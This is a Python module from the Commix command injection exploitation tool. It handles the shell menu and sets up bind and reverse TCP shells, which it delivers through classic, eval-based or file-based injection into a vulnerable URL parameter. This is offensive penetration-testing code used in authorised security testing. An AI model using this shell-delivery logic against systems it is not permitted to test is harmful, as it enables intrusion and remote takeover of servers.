#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
from src.utils import logs
from src.utils import menu
from src.utils import settings
from src.core.shells import bind_tcp
from src.core.shells import reverse_tcp
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Execute the bind / reverse TCP shell
"""
def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, timesec, payload, OUTPUT_TEXTFILE, technique):

  if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
    # Command execution results.
    start = time.time()
    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    end = time.time()
    diff = end - start
    # Evaluate injection results.
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
  else:
    # Command execution results.
    start = time.time()
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    else:
      from src.core.injections.results_based.techniques.classic import cb_injector as injector
      whitespace = settings.WHITESPACES[0]
      if whitespace == settings.SINGLE_WHITESPACE:
        whitespace = _urllib.parse.quote(whitespace)
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    end = time.time()
    diff = end - start
    # Evaluate injection results.
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)

"""
Configure the bind TCP shell
"""
def bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique):
  settings.BIND_TCP = True
  # Set up RHOST / LPORT for the bind TCP connection.
  bind_tcp.configure_bind_tcp(separator)
  if settings.BIND_TCP == False:
    if settings.REVERSE_TCP == True:
      os_shell_option = "reverse_tcp"
      reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
    return go_back, go_back_again

  while True:
    if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_bind_tcp_options(settings.RHOST)
    else:
      cmd = bind_tcp.bind_tcp_options(separator)
      result = checks.check_bind_tcp_options(cmd)
    if result != None:
      if result == 0:
        go_back_again = False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.BIND_TCP = False
      elif result == 3:
        settings.BIND_TCP = False
        reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
      return go_back, go_back_again

    # execute bind TCP shell
    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, timesec, payload, OUTPUT_TEXTFILE, technique)

"""
Configure the reverse TCP shell
"""
def reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique):
  settings.REVERSE_TCP = True
  # Set up LHOST / LPORT for the reverse TCP connection.
  reverse_tcp.configure_reverse_tcp(separator)
  if settings.REVERSE_TCP == False:
    if settings.BIND_TCP == True:
      os_shell_option = "bind_tcp"
      bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
    return go_back, go_back_again

  while True:
    if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_reverse_tcp_options(settings.LHOST)
    else:
      cmd = reverse_tcp.reverse_tcp_options(separator)
      result = checks.check_reverse_tcp_options(cmd)
    if result != None:
      if result == 0:
        go_back_again = False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.REVERSE_TCP = False
      elif result == 3:
        settings.REVERSE_TCP = False
        bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
        #reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
      return go_back, go_back_again

    # execute reverse TCP shell
    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, timesec, payload, OUTPUT_TEXTFILE, technique)

"""
Check commix shell options
"""
def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE):
  os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result)

  if os_shell_option == "back" or os_shell_option == True or os_shell_option == False:
    go_back = True
    if os_shell_option == False:
      go_back_again = True
    return go_back, go_back_again

  # The "os_shell" option
  elif os_shell_option == "os_shell":
    warn_msg = "You are into the '" + os_shell_option + "' mode."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    return go_back, go_back_again

  # The "bind_tcp" option
  elif os_shell_option == "bind_tcp":
    go_back, go_back_again = bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
    return go_back, go_back_again

  # The "reverse_tcp" option
  elif os_shell_option == "reverse_tcp":
    go_back, go_back_again = reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, timesec, payload, OUTPUT_TEXTFILE, technique)
    return go_back, go_back_again

  # The "quit" / "exit" options
  elif os_shell_option == "quit" or os_shell_option == "exit":
    checks.quit(filename, url, _ = True)

  else:
    return go_back, go_back_again

